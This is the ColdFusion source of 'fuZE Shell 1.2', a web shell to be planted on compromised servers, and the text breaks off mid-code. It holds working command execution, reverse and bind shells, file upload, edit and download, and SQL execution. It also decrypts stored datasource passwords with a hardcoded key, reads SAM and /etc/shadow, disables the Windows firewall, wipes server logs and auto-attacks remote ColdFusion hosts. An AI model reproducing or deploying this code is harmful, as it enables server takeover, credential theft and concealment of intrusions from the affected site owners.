<html>

<!---
#======================================#
# DeV: XiX           .###      9/26/11 #
#                    #                 #
#              ###  /##/               #
#             #    ,#                  #
# v3r 1.2     \#####`                  #
#======================================#
#                 FuZE                 #
#======================================#
#                                      #
# Changes in this release:             #
# > AutoPWN improved                   #
#                                      #
# ThX ^_^:                             #
# > fractal - css & jquery             #
# > chippy1337                         #
# > MoJiNao, xXx, & Seraph             #
#                                      #
#======================================#
--->

<!--- _________Login_config_________ ---->
<cfset UserName="god">
<cfset Password="c21f969b5f03d33d43e04f8f136e7682"> <!--- MD5 --->
<!--- ------------------------------ ---->

<head>
<cfsetting requesttimeout="3600">
<cfset tickBegin = GetTickCount()>
<cfset so = CreateObject("java", "java.lang.System")>
<cftry>
<cfobject type="com" class="scripting.filesystemobject" name="fso" action="connect">
<cfcatch type="any">
<cftry>
<cfobject type="com" class="scripting.filesystemobject" name="fso" action="create">
<cfcatch> <!--- N/A ---> </cfcatch>
</cftry>
</cfcatch>
</cftry>
<cfif isDefined("FSO")><cfset Drives = FSO.Drives></cfif>
<cfset icon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAESElEQVR42u2VW0ibZxzG3y/xEKPxlFjrYSqWFkXxgPUAzjCJurkLW+rooL3pTe9Km4uW3ll3V+YYyOjN2EAEUQRjMjwNhI0Zg0zCrAYRvHCIh0HUiOdj0uf5yFe0cTUbpr3xhZd8id/7Pr//8z8oiY+8pEuAjyFaVlamPT4+jnQ6nZ4PBmAymXITExMfxMTE1Gq12pylpaU/e3t7Pws5QG1trSEuLu77vLy8e7GxsWr+dnR0JCYnJ3/t6Oj4IqQA9fX1BVlZWX3Z2dmfhIeHC5VKJWC9ODg4EBMTE7bOzs7bIQOoq6u7npOT40hPTzco4j6fTxweHoq9vT0xOzvb3d7e/nVIAIxGowaRj+fm5uZHRES8jZx7YWHh7/X19WG32z04NDRkCQkAon9RWVnZrNFohFqtloV3d3cPZ2ZmHm9sbPw4MDDgVd69cIDy8nJ9UVHRHKzXMXraToDp6Wkziq713fcvHADt9ryiouJlVFSUCAsLkyt+eXn5t8XFRZPVavWFHKCxsdGF3OfRfkmShNfrFePj41+tra05t7a2jlCQHnzf/leA0tLSOFh3F71rwmc+oriCIlLzIn8uJ1E81WeJl5SU3EAKZjBwpMjISBmADuCM2NnZEdvb22J+ft48PDzcGgCAwxKozWlpac3JycmxtI/Vy0u4KL6/vy8YSVdX182zAKqrq5uQ/28w6QRbj4s1QIjNzU3hcDj4bMYMCARA1f4A6x7xsCKuXMDFS9i/Ho/H2d3dHQBQWFgoZWZmzl7Dov1K3xMc+Rcul0usrKyI+Ph4M55PA+Dw5wUFBYMYlRIrV4mYorReiYITDDY6LRZLAAAc/LK4uLgfs16OngOHwnNzcwKtJ8MzDampqWaM4dMAsM2G3cDDSuQomD9woAeiB4RQQJBPN3LYc4b9Iwj+Uwqtrq7KogjmW6TtH8IwAL8jv09NTf11CgA5X05KSrpqMBgE2wcgDuhW2Ww2rwhiYerdQtFaOXQYACHw/fXo6GjReWdlgJSUlF2IayhOWgB8NzIy8iwYcaROj6gmUDvpBGCh0i3cdWdsbKw3KAA4sASAFBYgc48L7HDAiOnle99h2K5DtH1oOSPFWSOY8wK1ZEf0VcEEIAPAfltCQkKDTqeTLWQUyJkF3fAz9jFyyRZVQUhCganYJWjPq3jnKYRvsFXpHPOO530EcdNut7uCBtDr9bcQvRUtItcAo+Gl/GRFs6242SHc/F15h3YTmH3OgYP3zf39/a3BiL8F4EIKrMg9i4k1IINwU1h55nRTALiU4URxTjn87Sf8w3kYrPgpAKRBC/pOONFAJ5BHwZRER0fLm/VBGEIQgC1FcQojFayVV2jbJ21tbUF1TgAAV0ZGhgSx+xB7Doh8BYKOKBAEYA34e9oHiNcQftHS0vLLfxE+E+DkqqmpyUJhxp90wZ8Gye+ADx3gbmpqWvw/wucCfKh1CXAJ8AZf/R8/6E7SXwAAAABJRU5ErkJggg==">
<cfset icon_close = "data:image/gif;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAANAA0DASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAABgT/xAAlEAACAgAEBQUAAAAAAAAAAAABAwIEAAUREgYHIUFhEzFCcaH/xAAVAQEBAAAAAAAAAAAAAAAAAAAGB//EABgRAQADAQAAAAAAAAAAAAAAAAEAAgMR/9oADAMBAAIRAxEAPwA9SsMvZrdQqw9Ta9iQkfUkYSju/D474Kc1cxLnZfBLGRiuLB1kdT1j1OD93i67ZezYlaFSdJ2yBOpkSTqT3I9h9Yi4lzuxnDkusLhGcI7TKPz8nzisNunIezxa2Fn/2Q==">
<title>.:: &fnof;uZE Shell ::.</title>
<link rel="SHORTCUT ICON" href="<cfoutput>#icon#</cfoutput>">
<style type="text/css">
html,body{font-family:Verdana,Arial,Helvetica,sans-serif;font-size:11px;background-color:black;color:#bbbbbb;height:98%;overflow:inherit}
table.header-table td { padding:10px; border-width:5px; border-style:outset; }
table.content-table td { padding:10px; border-width:5px; border-style:outset; }
table.function-table td { padding:10px; border-width:5px; border-style:outset; }
textarea.report { width:100%;min-width:400px;background-color:black;color:#bbbbbb; }
#mask { position:absolute; z-index:9000; background-color:#000; display:none; }
#boxes .window { position:fixed;  left:0;  top:0;  width:530px; display:none;  z-index:9999; padding:20px; background-color:black;color:#bbbbbb;border-left:solid 1px #00009f;border-right:solid 1px #00009f;border-bottom:solid 1px #00009f; }
#layer1_handle{position:relative;background-color:#00009F;padding:2px;text-align:center;color:#FFF;vertical-align:middle;top:-35px;margin-left:-21px;margin-right:-21px;}
#_close{float:right;text-decoration:none;color:#FFF;}
#_color{background-color:black;color:#bbbbbb;}
#nav a{height:14px;display:block;border:1px solid #000;color:#FFF;text-decoration:none;background-color:#000098;padding-bottom:5px}
#nav a:hover{background-color:#696AF6;color:#FFF}
._btn{padding:0;margin:0;width:80px;font-size:12px;background-color:#0000B0;color:#bbbbbb;}
.container{position:relative;top:-115px;text-align:center;font-size:14px;float:right;}
.menu{position:relative;top:-21px;height:20px;width:280px;float:right;padding-top:5px;padding-bottom:5px;}
</style>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
<script>
$(document).ready(function() {  
    //select all the a tag with name equal to modal
    $('a[name=modal]').click(function(e) {
        //Cancel the link behavior
        e.preventDefault();
        //Get the A tag
        var id = $(this).attr('href');     
        //Get the screen height and width
        var maskHeight = $(document).height();
        var maskWidth = $(window).width();     
        //Set height and width to mask to fill up the whole screen
        $('#mask').css({'width':maskWidth,'height':maskHeight});         
        //transition effect    
        $('#mask').fadeIn(1000);   
        $('#mask').fadeTo("slow",0.8);      
        //Get the window height and width
        var winH = $(window).height();
        var winW = $(window).width();               
        //Set the popup window to center
        $(id).css('top',  winH/2-$(id).height()/2);
        $(id).css('left', winW/2-$(id).width()/2);     
        //transition effect
        $(id).fadeIn(2000);     
    });
    //if close button is clicked
    $('.window .close').click(function (e) {
        //Cancel the link behavior
        e.preventDefault();
        $('#mask, .window').hide();
    });    
    //if mask is clicked
    $('#mask').click(function () {
        $(this).hide();
        $('.window').hide();
    });        
});
</script>
</head>
<body>

<cfif IsDefined("LoginButton")>
<cfif Form.UserName eq "#UserName#" and Hash("#Form.Password#") eq "#Password#">
<cflogin>
<cfloginuser name="#UserName#" password="#Password#" roles="admin">
</cflogin>
</cfif>
</cfif>

<cfif IsDefined("LogoutButton")>
 <cflogout>
</cfif>

<cfif IsUserLoggedIn() eq "Yes">
<div id="boxes">     
    <div id="execute" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>Console</div>
        <center><pre>:: Execute command on server ::</pre></center>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
        <input type="text" id="_color" name="exec" size=40 <cfif isdefined("Form.exec")>value="<cfoutput>#htmleditformat(Form.exec)#</cfoutput>"</cfif>>
        <input name="submit" value="Execute" class="_btn" type="submit"><br />
        <input type=checkbox name="nolimit"> No execution time limit
        </form><br />
    </div>
    <div id="edit" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>Edit</div>
        <center><pre>:: Edit file ::</pre></center>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
        File path | <input type="text" id="_color" name="EditFile" size=40 <cfif isDefined("Form.EditFile")>value="<cfoutput>#htmleditformat(Form.EditFile)#</cfoutput>"</cfif>>
        <input name="submit" value="Edit" class="_btn" type="submit">
        </form><br />
    </div>
    <div id="reverse" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>Reverse Shell</div>
        <center><pre>:: Reverse shell ::</pre></center>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
        <center><input type="text" id="_color" name="reverseip" size=15 <cfif isDefined("Form.reverseip")>value="<cfoutput>#htmleditformat(Form.reverseip)#</cfoutput>"</cfif>> :
        <input type="text" id="_color" name="reverseport" size=5 <cfif isDefined("Form.reverseport")>value="<cfoutput>#htmleditformat(Form.reverseport)#</cfoutput>"</cfif>>
        <input name="submit" value="Connect" class="_btn" type="submit"></center>
        </form>
    </div>
    <div id="bind" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>Bindshell</div>
        <center><pre>:: Bindshell ::</pre></center>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
        <center>[1024-65535] <input type="text" id="_color" name="bindport" size=10 <cfif isdefined("Form.bindport")>value="<cfoutput>#htmleditformat(Form.bindport)#</cfoutput>"</cfif>>
        <input name="submit" value="Bind" class="_btn" type="submit">
        <a href="data:text/html;base64,PGh0bWw+Cjxib2R5Pgo8aDI+VGlwczwvaDI+Cjx1bD4KPGxpPkRpc2FibGUgdGhlIGZpcmV3YWxsIGJlZm9yZSB1c2luZyB0aGlzIGZ1bmN0aW9uIChuZXRzaCBmaXJld2FsbCBzZXQgb3Btb2RlIGRpc2FibGUpLjwvbGk+CjxsaT5EbyBub3Qgc3RvcCB0aGUgcmVxdWVzdCBvciB0aGUgYmluZHNoZWxsIHdpbGwgZmFpbCwgYW5kIHlvdSB3aWxsIG5lZWQgdG8gdXNlIGFub3RoZXIgcG9ydDwvbGk+CjxsaT5UaGUgYmluZHNoZWxsIG9ubHkgYWNjZXB0cyB2YWxpZCBleGVjdXRhYmxlcyBmcm9tIHdpdGhpbiB0aGUgT1MncyBkZWZpbmVkIFBBVEhzLiBNYWtlIHN1cmUgaXQgZXhpc3RzLCBhbmQgaXQgaXMgaW4gb25lIG9mIHRoZSBkaXJlY3RvcmllcyBkZWZpbmVkIGJ5IHRoZSBlbnZpcm9ubWVudCAncGF0aCcgdmFyaWFibGUuIEZvciBleGFtcGxlIChXaW5kb3dzKSwgJ2RpcicgZG9lcyBub3QgZXhpc3QsIGJ1dCAnaG9zdG5hbWUnIGRvZXMuPC9saT4KPGxpPlRoaXMgaXMgYSBWRVJZIHVuc3RhYmxlIENGIGJpbmRzaGVsbCAocHJvdG90eXBlKSEgTGF0ZXIgcmVsZWFzZXMgd2lsbCBmaXggdGhlIHZhcmlvdXMgaXNzdWVzIGluIHRoZSBwcmVzZW50IG9uZS48L2xpPgo8L3VsPgo8L2JvZHk+CjwvaHRtbD4K"> [Tips]</a></center>
        </form>
    </div>
    <div id="functions" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>Functions</div>
        <center><pre>:: Functions ::</pre></center>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
        <select name="function" style="width: 325px">
        <option selected="yes">Select a function</option><optgroup label="ColdFusion"><option>Dump datasource passwords</option><option>Dump CF hashes</option><option>Restart JRUN server (CF)</option><option>Wipe ColdFusion logs</option></optgroup><optgroup label="Windows"><option>Disable Windows firewall</option><option>Enable Telnet service</option><option>Show opened ports [W]</option><option>Read SAM</option><option>Read SECURITY</option><option>Read SYSTEM</option><option>Read IIS paths</option><option>View open sessions [W]</option><option>View local shares</option><option>View domain shares</option><option>View users</option><option>View running processes [W]</option><option>View system info [W]</option><option>Check disk for consistency</option></optgroup><optgroup label="Linux"><option>Find SUID files</option><option>Find SGID files</option><option>Find all *conf* files</option><option>Find all .*_history files</option>
        <option>Find all *.pwd files</option><option>Find all .*rc files</option><option>Find all writable directories and files</option><option>Find all writable directories and files in current dir</option><option>Read /etc/passwd</option><option>Read /etc/shadow</option><option>Read /proc/self/environ</option><option>Show opened ports [L]</option><option>View open sessions [L]</option><option>View recent sessions</option><option>View running processes [L]</option>
        <option>View memory info</option><option>View CPU info</option><option>View system info [L]</option></optgroup></select><input name="submit" value="Execute" class="_btn" type="submit"></form>
    </div>
    <div id="decrypt" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>Decrypter</div>
        <center><pre>:: CF hash decrypter ::</pre></center>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
        B64 CF hash | <input type="text" id="_color" name="decrypt_hash" size=35 <cfif isdefined("Form.decrypt_hash")>value="<cfoutput>#htmleditformat(Form.decrypt_hash)#</cfoutput>"</cfif>>
        <input name="submit" value="Decrypt" class="_btn" type="submit">
        </form>
    </div>
    <div id="updown" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>File Transfer</div>
        <center><pre>:: Upload/Download files on server ::</pre></center>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>" enctype="multipart/form-data" name="Upload" id="Upload"><center>
        <input type="file" name="File"/>
        <input class="_btn" type="submit" name="Upload" value="Upload"/></center>
        </form>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
        Path | <input type="text" id="_color" name="Download" size=40 <cfif isDefined("Form.Download")>value="<cfoutput>#htmleditformat(Form.Download)#</cfoutput>"</cfif>>
        <input name="submit" value="Download" class="_btn" type="submit">
        </form>
    </div>
    <div id="upremote" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>Remote upload</div>
        <center><pre>:: Upload files from remote server ::</pre></center>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
        URL | <input type="text" id="_color" name="RUpload" size=40 <cfif isDefined("Form.RUpload")>value="<cfoutput>#htmleditformat(Form.RUpload)#</cfoutput>"</cfif>>
        <input name="submit" value="Upload" class="_btn" type="submit">
        </form>
    </div>
    <div id="runsql" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>Sql</div>
        <center><pre>:: Run SQL query ::</pre></center>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
        SQL query | <input type="text" id="_color" name="exec_sql" size=35<cfif isdefined("Form.exec_sql")>value="<cfoutput>#htmleditformat(Form.exec_sql)#</cfoutput>"</cfif>><br />
        Datasource | <input type="text" id="_color" name="datasource" size=15<cfif isdefined("Form.datasource")>value="<cfoutput>#htmleditformat(Form.datasource)#</cfoutput>"</cfif>><br />
        User : Pass | <input type="text" id="_color" name="db_username" size=15 <cfif isdefined("Form.db_username")>value="<cfoutput>#htmleditformat(Form.db_username)#</cfoutput>"</cfif>><input type="text" id="_color" name="db_password" size=15 <cfif isdefined("Form.db_password")>value="<cfoutput>#htmleditformat(Form.db_password)#</cfoutput>"</cfif>><br />
        <input name="submit" value="Run" class="_btn" type="submit">
        </form>
    </div>
    <div id="scanlan" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>Scan</div>
        <center><pre>:: Scan LAN for CF ::</pre></center>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
        <center><input name="cfscan" value="Scan" class="_btn" type="submit"></center>
        </form>
    </div>
    <div id="registry" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>Registry</div>
        <center><pre>:: Registry ::</pre></center>
        <form method="post" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>"><table>
        <tr><td>Path | </td><td><input name="regpath" type="text" id="_color" size="40" value="<cfif isDefined("Form.regpath")><cfoutput>#htmleditformat(Form.regpath)#</cfoutput><cfelse>HKEY_LOCAL_MACHINE\</cfif>" /></td></tr><tr>
        <td>Key | </td><td><input type="text" id="_color" name="Entry" size="15" <cfif isDefined("Form.Entry")>value="<cfoutput>#htmleditformat(Form.Entry)#</cfoutput>"</cfif> /></td></tr><tr>
        <td>New key | </td><td><input type="text" id="_color" name="newentry" size="15" <cfif isDefined("Form.newentry")>value="<cfoutput>#htmleditformat(Form.newentry)#</cfoutput>"</cfif> /></td></tr></table>
        <select name="regtype">
            <option value="dWord">dWord</option>
            <option value="string">string</option>
        </select>
        <br />
        <input class="_btn" type="submit" name="Submit" value="Submit" />
        </form>
    </div>
    <div id="autopwn" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>AutoPWN</div>
        <center><pre>:: AutoPWN remote CF ::</pre></center>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
        Target | http://<input type="text" id="_color" name="target_host" size=40 <cfif isDefined("Form.target_host")>value="<cfoutput>#htmleditformat(Form.target_host)#</cfoutput>"</cfif>>/
        <input name="submit" value="AutoPWN" class="_btn" type="submit">
        </form>
    </div>
    <div id="nuke" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>Nuke</div>
        <center><pre>:: Nuke shell ::</pre></center>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
        <center><input name="nuke" value="Nuke" class="_btn" type="submit"></center>
        </form>
    </div>
    <div id="irc" class="window">
        <div id="layer1_handle"><a href="#" id="_close" class="close"><img src="<cfoutput>#icon_close#</cfoutput>" border=0></a>IRC</div>
        <center><pre>:: IRC datapipe ::</pre></center>
        <table>
        <form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>"><center>
        <tr><td>IP:</td><td><input type="text" id="_color" name="ircip" size=15 <cfif isDefined("Form.ircip")>value="<cfoutput>#htmleditformat(Form.ircip)#</cfoutput>"<cfelse>value="127.0.0.1"</cfif>></td></tr>
        <tr><td>Port:</td><td><input type="text" id="_color" name="ircport" size=5 <cfif isDefined("Form.ircport")>value="<cfoutput>#htmleditformat(Form.ircport)#</cfoutput>"<cfelse>value="6667"</cfif>></td></tr>
        <tr><td>Nick name:</td><td><input type="text" id="_color" name="ircnick" size=15 <cfif isDefined("Form.ircnick")>value="<cfoutput>#htmleditformat(Form.ircnick)#</cfoutput>"<cfelse>value="fuZE"</cfif>></td></tr>
        <tr><td>User name:</td><td><input type="text" id="_color" name="ircuname" size=15 <cfif isDefined("Form.ircuname")>value="<cfoutput>#htmleditformat(Form.ircuname)#</cfoutput>"<cfelse>value="fuZE"</cfif>></td></tr>
        <tr><td>Real name:</td><td><input type="text" id="_color" name="ircrname" size=20 <cfif isDefined("Form.ircrname")>value="<cfoutput>#htmleditformat(Form.ircrname)#</cfoutput>"<cfelse>value="fuZE CF IRC Datapipe"</cfif>></td></tr>
        <tr><td>Channel:</td><td><input type="text" id="_color" name="ircchan" size=15 <cfif isDefined("Form.ircchan")>value="<cfoutput>#htmleditformat(Form.ircchan)#</cfoutput>"<cfelse>value="#fuZE"</cfif>></td></tr>
        <tr><td><input name="submit" value="Connect" class="_btn" type="submit"></center></td></tr>
        </form>
        </table>
    </div>
    <div id="mask"></div>
</div>
<table class="header-table" width=100%>
<tr>
<td><img src="<cfoutput>#icon#</cfoutput>"><sup> &fnof;uZE Shell 1.2</sup></td>
<td><div style="float:left;"><cfoutput><pre>#dateformat(now(),'mm-dd-yyyy')# #timeformat(now(),'HH:mm:ss')# Your IP: #cgi.remote_addr# [#cgi.remote_host#] Server IP: #cgi.local_addr# [#cgi.http_host#]</pre></cfoutput></div>
<div style="float:right;"><cfform action="" method="post" name="LogoutForm"><cfinput class="_btn" type="submit" name="LogoutButton" value="Logout"></cfform></div>
</td>
</tr>
<tr>
<td align="right"><pre>OS :<br />CF :<br />ID :<br />CWD :<br />Drive info :</pre></td>
<td>
<cfoutput>
<pre>#server.os.name# [#server.os.version#] #server.os.arch#<br />#server.coldfusion.productname# [#server.coldfusion.productlevel#] #server.coldfusion.productversion#<br />#so.getProperty("user.name")#<br />#getDirectoryFromPath(getCurrentTemplatePath())#<br /><cfif isDefined("FSO")><cfloop collection="#drives#" item="this"><cfif this.DriveLetter is not "A">#this.DriveLetter# [<cfif this.isReady AND ISDefined("this.TotalSize")>#NumberFormat(round(evaluate(this.TotalSize/1024/1024/1024)))# GB </cfif><cfswitch expression="#this.DriveType#">
<cfcase value="1">Removable</cfcase>
<cfcase value="2">Fixed</cfcase>
<cfcase value="3">Network</cfcase>
<cfcase value="4">CDROM</cfcase>
<cfcase value="5">RAMDisk</cfcase>
<cfdefaultcase>Unknown</cfdefaultcase>
</cfswitch>] </cfif></cfloop><cfelse>N/A</cfif></pre>
</cfoutput>
</td>
</tr>
</table>

<table class="content-table" width=100%>
<tr><td width="75%"><cfoutput>
<cfif isdefined("Form.exec")>
 <cfif isdefined("Form.nolimit")><cfset exectimeout=3600><cfelse><cfset exectimeout=10></cfif>
 <cfif server.os.name neq "UNIX">
  <pre>Executing 'cmd.exe /c #htmleditformat(Form.exec)#'</pre>
  <cfexecute name="cmd.exe" arguments="/c #Form.exec#" timeout="#exectimeout#" variable="cmdout"></cfexecute>
 <cfelse>
  <pre>Executing 'sh -c "#htmleditformat(REReplace(Form.exec,"""","'","ALL"))#"'</pre>
  <cfexecute name="sh" arguments="-c ""#REReplace(Form.exec,"""","'","ALL")#""" timeout="#exectimeout#" variable="cmdout"></cfexecute>
 </cfif>
 <textarea class="report" rows="20">#htmleditformat(cmdout)#</textarea>
<cfelseif isdefined("Form.EditFile")>
<pre>Editing file '#htmleditformat(Form.EditFile)#'</pre>
<cftry>
<cfif fileexists(Form.EditFile)>
<!--- OK --->
<cfelse>
<cfthrow message="File not found">
</cfif>
<cffile action="Read" file="#Form.EditFile#" variable="FileData">
<form method="POST" action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>">
<textarea name="FileContent" class="report" rows="20"><cfoutput>#htmleditformat(FileData)#</cfoutput></textarea>
Save to | <input type="text" id="_color" name="SaveFile" size=40 value="<cfoutput>#Form.EditFile#</cfoutput>"> <input name="submit" value="Save" class="_btn" type="submit">
</form>
<cfcatch><textarea class="report" rows="20">Error<cfif isDefined("cfcatch.message")>: <cfoutput>#cfcatch.message#</cfoutput></cfif></textarea></cfcatch>
</cftry>
<cfelseif isDefined("Form.SaveFile")>
<pre>Saving file '#htmleditformat(Form.SaveFile)#'</pre>
<textarea class="report" rows="20">
<cftry>
<cffile action="Write" file="#Form.SaveFile#" output="#Form.FileContent#" addnewline = "no">Save success
<cfcatch>Error<cfif isDefined("cfcatch.message")>: <cfoutput>#cfcatch.message#</cfoutput></cfif></cfcatch>
</cftry>
</textarea>
<cfelseif isdefined("Form.bindport")>
<pre>Binding shell to port #htmleditformat(Form.bindport)#</pre>
<textarea class="report" rows="20">
<cftry>
<cfscript>
try{

// Create socket
serversocket=createObject("java","java.net.ServerSocket");
serversocket.init(Form.bindport);
writeoutput("ServerSocket created at port #serversocket.getLocalPort()##chr(10)#");

// Accept incoming connections
connection=serversocket.accept();
writeoutput("Connection received from #connection.getInetAddress().getHostName()##chr(10)#");

// Establish connection
try{
instream=createObject("java","java.io.BufferedReader").init(createObject("java","java.io.InputStreamReader").init(connection.getInputStream()));
outstream=createObject("java","java.io.PrintWriter").init(connection.getOutputStream());
writeoutput("Connection successful!#chr(10)#");
} catch (IOException e) {
writeoutput("IO Exception: Read failed#chr(10)#");
}

// Communicate
outstream.println(".:: fuZE CF Bindshell ::.");
outstream.print("> ");
outstream.flush();
while(True){
str = instream.readLine();
cmd = str.split(" ");
if (not str.matches("exit")){
p = createObject("java","java.lang.ProcessBuilder").init(cmd).start();
i = createObject("java","java.io.InputStreamReader").init(p.getInputStream());
br = createObject("java","java.io.BufferedReader").init(i);
line=br.readLine();
while (isDefined("line")) {
outstream.println(line);
outstream.flush();
line = br.readLine();
}
br.close();
i.close();
outstream.print("> ");
outstream.flush();
}
else {
outstream.println("Terminating");
outstream.close();
instream.close();
connection.close();
serversocket.close();
}
}

}catch (Exception e) {
writeoutput("Exception: Error#chr(10)#");
}
</cfscript>
<cfcatch>Connection terminated</cfcatch>
</cftry>
</textarea>
<cfelseif isDefined("Form.reverseip") and isDefined("Form.reverseport")>
<pre>Sending shell to #htmleditformat(Form.reverseip)#:#htmleditformat(Form.reverseport)#</pre>
<textarea class="report" rows="20">
<cftry>
<cfscript>
try{

// Create socket
socket=createObject("java","java.net.Socket");

// Connect to remote host
socket.connect(createObject("java","java.net.InetSocketAddress").init(Form.reverseip,Form.reverseport));
writeoutput("Remote port reached: #socket.isConnected()##chr(10)#");

// Establish connection
try{
instream=createObject("java","java.io.BufferedReader").init(createObject("java","java.io.InputStreamReader").init(socket.getInputStream()));
outstream=createObject("java","java.io.PrintWriter").init(socket.getOutputStream());
writeoutput("Connection successful!#chr(10)#");
} catch (IOException e) {
writeoutput("IO Exception: Read failed#chr(10)#");
}

// Communicate
outstream.println(".:: fuZE CF Reverse Shell ::.");
outstream.print("> ");
outstream.flush();
while(True){
str = instream.readLine();
cmd = str.split(" ");
if (not str.matches("exit")){
p = createObject("java","java.lang.ProcessBuilder").init(cmd).start();
i = createObject("java","java.io.InputStreamReader").init(p.getInputStream());
br = createObject("java","java.io.BufferedReader").init(i);
line=br.readLine();
while (isDefined("line")) {
outstream.println(line);
outstream.flush();
line = br.readLine();
}
br.close();
i.close();
outstream.print("> ");
outstream.flush();
}
else {
outstream.println("Terminating");
outstream.close();
instream.close();
socket.close();
}
}

}catch (Exception e) {
writeoutput("Exception: Error#chr(10)#");
}
</cfscript>
<cfcatch>Connection terminated</cfcatch>
</cftry>
</textarea>
<cfelseif isDefined("Form.function")>
<pre>Function: '#htmleditformat(Form.function)#'</pre>
<textarea class="report" rows="20">
<cftry>
<cfswitch expression="#Form.function#">
<!--- ColdFusion functions --->
<cfcase value="Dump datasource passwords">Datasource : Password
<cfscript>
o=createobject("java","coldfusion.server.ServiceFactory").getDatasourceService().getDatasources();
for(i in o) {
if(len(o[i]["password"])){
dp=Decrypt(o[i]["password"], generate3DesKey("0yJ!@1$r8p0L@r1$6yJ!@1rj"), "DESede", "Base64") ;
writeoutput("#htmleditformat(i)# : #htmleditformat(dp)##chr(10)#");
}
}
</cfscript>
</cfcase>
<cfcase value="Dump CF hashes"><cffile action="READ" file="#Server.ColdFusion.RootDir#\lib\password.properties" variable="cfhashes">#htmleditformat(cfhashes)#</cfcase>
<cfcase value="Restart JRUN server (CF)">
<cfscript>
oJRun = CreateObject("java","jrunx.kernel.JRun");
oJRun.restart(oJRun.getServerName());
</cfscript>
</cfcase>
<cfcase value="Wipe ColdFusion logs">
<cfset sf = CreateObject("java", "coldfusion.server.ServiceFactory")>
<cfset logDir = sf.LoggingService.getLogDirectory()>
<cfif server.os.name neq "UNIX">
<cfset osSlash = "\">
<cfelse>
<cfset osSlash = "/">
</cfif>
<cfdirectory action="list" directory="#logDir#" name="logs" filter="*.log">
<cfloop query="logs">
<cffile action="write" file="#logDir##osSlash##logs.Name#" output="## Purged" addnewline="yes">
</cfloop>
</cfcase>
<!--- Windows functions --->
<cfcase value="Disable Windows firewall"><cfexecute name="cmd.exe" arguments="/c netsh firewall set opmode disable" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Enable Telnet service"><cfexecute name="cmd.exe" arguments="/c sc config tlntsvr start= demand & net start telnet" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Show opened ports [W]"><cfexecute name="cmd.exe" arguments="/c netstat -aon" timeout="15" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Read SAM"><cfexecute name="cmd.exe" arguments="/c type %WINDIR%\repair\SAM" timeout="15" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Read SECURITY"><cfexecute name="cmd.exe" arguments="/c type %WINDIR%\repair\SECURITY" timeout="15" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Read SYSTEM"><cfexecute name="cmd.exe" arguments="/c type %WINDIR%\repair\SYSTEM" timeout="15" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Read IIS paths">Path : Domain : LogFileDirectory
<cftry>
<cfset xmlPath=arrayNew(1)>
<cfset xmllocation=arraynew(1)>
<cfset xmlServerindings=arraynew(1)>
<cfset xmlLogFileDirectory=arraynew(1)>
